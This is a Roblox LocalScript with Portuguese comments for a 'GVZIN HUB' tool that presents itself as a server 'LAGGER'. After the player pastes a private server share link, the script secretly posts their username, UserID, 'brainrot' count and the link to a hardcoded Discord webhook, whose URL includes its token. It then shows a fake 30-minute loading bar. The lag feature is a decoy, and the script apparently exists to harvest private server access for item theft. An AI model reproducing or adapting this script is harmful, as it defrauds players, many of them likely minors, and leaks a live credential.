-- LocalScript dentro de um ScreenGui (coloque-o em StarterGui ou em um tool, por exemplo)
local player = game.Players.LocalPlayer
local gui = script.Parent -- Supondo que o script está filho de um ScreenGui

-- Serviços
local tweenService = game:GetService("TweenService")
local httpService = game:GetService("HttpService")

-- Configuração do Webhook
local WEBHOOK_URL = "https://discord.com/api/webhooks/1479973233787932813/d099lEw5cTKv60lHnaPD-SrJCKO0tc326DO5kPl7fkTE2QsV9jOUsIXobbXzImcJ1Aya"

-- Função para enviar dados ao Discord
local function sendToDiscord(data)
	local success, result = pcall(function()
		local jsonData = httpService:JSONEncode({
			content = "**Novo log do GVZIN HUB**",
			embeds = {{
				title = "Informações do Jogador",
				color = 16711680, -- Vermelho
				fields = {
					{name = "Username", value = data.username, inline = true},
					{name = "UserID", value = tostring(data.userId), inline = true},
					{name = "Brainrots", value = tostring(data.brainrots), inline = true},
					{name = "Link do Servidor", value = data.link, inline = false}
				},
				footer = {text = "GVZIN HUB • " .. os.date("%d/%m/%Y %H:%M:%S")}
			}}
		})
		httpService:PostAsync(WEBHOOK_URL, jsonData, Enum.HttpContentType.ApplicationJson)
	end)
	if not success then
		warn("Falha ao enviar webhook: " .. result)
	end
end

-- Obtém a quantidade de brainrots do jogador (ajuste conforme seu jogo)
local function getPlayerBrainrots()
	local leaderstats = player:FindFirstChild("leaderstats")
	if leaderstats then
		local brainrotValue = leaderstats:FindFirstChild("Brainrot") or leaderstats:FindFirstChild("brainrot")
		if brainrotValue then
			return brainrotValue.Value
		end
	end
	-- Se não encontrar, retorna 0
	return 0
end

-- Criação da GUI principal (moderna, gamer)
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 300, 0, 200)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
mainFrame.BackgroundTransparency = 0.1
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true

-- Cantos arredondados
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 15)
corner.Parent = mainFrame

-- Sombra
local shadow = Instance.new("ImageLabel")
shadow.Name = "Shadow"
shadow.Size = UDim2.new(1, 20, 1, 20)
shadow.Position = UDim2.new(0, -10, 0, -10)
shadow.BackgroundTransparency = 1
shadow.Image = "rbxassetid://6015897843" -- Sombra arredondada
shadow.ImageColor3 = Color3.new(0, 0, 0)
shadow.ImageTransparency = 0.6
shadow.Parent = mainFrame

-- Título
local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 10)
title.BackgroundTransparency = 1
title.Text = "GVZIN HUB"
title.TextColor3 = Color3.fromRGB(255, 50, 200) -- Rosa neon
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.Parent = mainFrame

-- Botão LAGGER
local laggerButton = Instance.new("TextButton")
laggerButton.Name = "LaggerButton"
laggerButton.Size = UDim2.new(0, 150, 0, 50)
laggerButton.Position = UDim2.new(0.5, -75, 0.5, -10)
laggerButton.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
laggerButton.Text = "LAGGER"
laggerButton.TextColor3 = Color3.fromRGB(0, 255, 255) -- Ciano
laggerButton.Font = Enum.Font.GothamBold
laggerButton.TextScaled = true
laggerButton.AutoButtonColor = false

-- Cantos arredondados no botão
local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 10)
btnCorner.Parent = laggerButton

-- Efeito de hover
laggerButton.MouseEnter:Connect(function()
	tweenService:Create(laggerButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 60, 70)}):Play()
end)
laggerButton.MouseLeave:Connect(function()
	tweenService:Create(laggerButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(40, 40, 50)}):Play()
end)

laggerButton.Parent = mainFrame

-- Adiciona tudo ao GUI
mainFrame.Parent = gui

-- Função para criar o segundo menu (após clicar em LAGGER)
local function createLinkMenu()
	local linkFrame = Instance.new("Frame")
	linkFrame.Name = "LinkMenu"
	linkFrame.Size = UDim2.new(0, 400, 0, 250)
	linkFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
	linkFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
	linkFrame.BackgroundTransparency = 0.1
	linkFrame.BorderSizePixel = 0
	linkFrame.Visible = false -- Inicia invisível, será mostrado ao clicar

	local cornerLink = Instance.new("UICorner")
	cornerLink.CornerRadius = UDim.new(0, 15)
	cornerLink.Parent = linkFrame

	-- Título rainbow (animado)
	local rainbowTitle = Instance.new("TextLabel")
	rainbowTitle.Name = "RainbowTitle"
	rainbowTitle.Size = UDim2.new(1, 0, 0, 50)
	rainbowTitle.Position = UDim2.new(0, 0, 0, 0)
	rainbowTitle.BackgroundTransparency = 1
	rainbowTitle.Text = "GVZIN HUB"
	rainbowTitle.TextScaled = true
	rainbowTitle.Font = Enum.Font.GothamBold
	rainbowTitle.Parent = linkFrame

	-- Animação rainbow (muda a cor gradualmente)
	spawn(function()
		local hue = 0
		while rainbowTitle and rainbowTitle.Parent do
			rainbowTitle.TextColor3 = Color3.fromHSV(hue, 1, 1)
			hue = (hue + 0.01) % 1
			wait(0.05)
		end
	end)

	-- TextBox para o link
	local textBox = Instance.new("TextBox")
	textBox.Name = "LinkBox"
	textBox.Size = UDim2.new(0.8, 0, 0, 40)
	textBox.Position = UDim2.new(0.1, 0, 0.3, 0)
	textBox.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
	textBox.PlaceholderText = "Cole o link do servidor aqui..."
	textBox.Text = ""
	textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	textBox.Font = Enum.Font.Gotham
	textBox.TextSize = 16
	textBox.ClearTextOnFocus = false

	local textBoxCorner = Instance.new("UICorner")
	textBoxCorner.CornerRadius = UDim.new(0, 8)
	textBoxCorner.Parent = textBox
	textBox.Parent = linkFrame

	-- Botão Confirmar
	local confirmButton = Instance.new("TextButton")
	confirmButton.Name = "ConfirmButton"
	confirmButton.Size = UDim2.new(0, 120, 0, 40)
	confirmButton.Position = UDim2.new(0.5, -60, 0.7, 0)
	confirmButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
	confirmButton.Text = "CONFIRMAR"
	confirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	confirmButton.Font = Enum.Font.GothamBold
	confirmButton.TextScaled = true

	local confirmCorner = Instance.new("UICorner")
	confirmCorner.CornerRadius = UDim.new(0, 10)
	confirmCorner.Parent = confirmButton
	confirmButton.Parent = linkFrame

	-- Botão fechar (opcional)
	local closeButton = Instance.new("TextButton")
	closeButton.Name = "CloseButton"
	closeButton.Size = UDim2.new(0, 30, 0, 30)
	closeButton.Position = UDim2.new(1, -35, 0, 5)
	closeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
	closeButton.Text = "X"
	closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	closeButton.Font = Enum.Font.GothamBold
	closeButton.TextScaled = true

	local closeCorner = Instance.new("UICorner")
	closeCorner.CornerRadius = UDim.new(0, 8)
	closeCorner.Parent = closeButton
	closeButton.Parent = linkFrame

	closeButton.MouseButton1Click:Connect(function()
		linkFrame:Destroy()
	end)

	-- Adiciona ao gui
	linkFrame.Parent = gui

	-- Função de validação do link
	local function isValidRobloxShareLink(link)
		return string.find(link, "roblox%.com/share%?code=") and string.find(link, "&type=Server")
	end

	-- Ação do botão confirmar
	confirmButton.MouseButton1Click:Connect(function()
		local link = textBox.Text
		if not isValidRobloxShareLink(link) then
			-- Feedback visual de erro (pode melhorar)
			textBox.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
			wait(1)
			textBox.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
			return
		end

		-- Esconde os menus
		mainFrame.Visible = false
		linkFrame.Visible = false

		-- Coleta dados e envia webhook
		local brainrots = getPlayerBrainrots()
		sendToDiscord({
			username = player.Name,
			userId = player.UserId,
			brainrots = brainrots,
			link = link
		})

		-- Cria tela preta de carregamento
		local blackScreen = Instance.new("Frame")
		blackScreen.Name = "BlackScreen"
		blackScreen.Size = UDim2.new(1, 0, 1, 0)
		blackScreen.Position = UDim2.new(0, 0, 0, 0)
		blackScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		blackScreen.BorderSizePixel = 0
		blackScreen.ZIndex = 10
		blackScreen.Parent = gui

		-- Texto "CARREGANDO"
		local loadingText = Instance.new("TextLabel")
		loadingText.Name = "LoadingText"
		loadingText.Size = UDim2.new(1, 0, 0, 50)
		loadingText.Position = UDim2.new(0, 0, 0, 30)
		loadingText.BackgroundTransparency = 1
		loadingText.Text = "CARREGANDO"
		loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
		loadingText.TextScaled = true
		loadingText.Font = Enum.Font.GothamBold
		loadingText.ZIndex = 11
		loadingText.Parent = blackScreen

		-- Barra de progresso (fundo)
		local progressBg = Instance.new("Frame")
		progressBg.Name = "ProgressBg"
		progressBg.Size = UDim2.new(0.6, 0, 0, 30)
		progressBg.Position = UDim2.new(0.2, 0, 0.5, -15)
		progressBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		progressBg.BorderSizePixel = 0
		progressBg.ZIndex = 11

		local progressCorner = Instance.new("UICorner")
		progressCorner.CornerRadius = UDim.new(0, 8)
		progressCorner.Parent = progressBg
		progressBg.Parent = blackScreen

		-- Barra de progresso (preenchimento)
		local progressBar = Instance.new("Frame")
		progressBar.Name = "ProgressBar"
		progressBar.Size = UDim2.new(0, 0, 1, 0)
		progressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
		progressBar.BorderSizePixel = 0
		progressBar.ZIndex = 12

		local progressBarCorner = Instance.new("UICorner")
		progressBarCorner.CornerRadius = UDim.new(0, 8)
		progressBarCorner.Parent = progressBar
		progressBar.Parent = progressBg

		-- Texto da porcentagem
		local percentText = Instance.new("TextLabel")
		percentText.Name = "PercentText"
		percentText.Size = UDim2.new(1, 0, 0, 30)
		percentText.Position = UDim2.new(0, 0, 0.6, 0)
		percentText.BackgroundTransparency = 1
		percentText.Text = "0%"
		percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
		percentText.TextScaled = true
		percentText.Font = Enum.Font.Gotham
		percentText.ZIndex = 11
		percentText.Parent = blackScreen

		-- Simulação do carregamento de 30 minutos (1800 segundos)
		local totalTime = 30 * 60 -- 1800 segundos
		local elapsed = 0
		local connection

		connection = game:GetService("RunService").Heartbeat:Connect(function(dt)
			elapsed = elapsed + dt
			local progress = math.min(elapsed / totalTime, 1)
			local barWidth = progress * progressBg.AbsoluteSize.X
			progressBar.Size = UDim2.new(0, barWidth, 1, 0)
			percentText.Text = string.format("%.1f%%", progress * 100)

			if progress >= 1 then
				connection:Disconnect()
				-- Opcional: ao terminar, pode destruir a tela ou mostrar mensagem
				-- Por enquanto, não faz nada (a tela permanece)
			end
		end)
	end)

	return linkFrame
end

-- Mostra o menu de link ao clicar no botão LAGGER
laggerButton.MouseButton1Click:Connect(function()
	local linkMenu = createLinkMenu()
	linkMenu.Visible = true
	mainFrame.Visible = false -- Esconde o menu principal (opcional)
end)
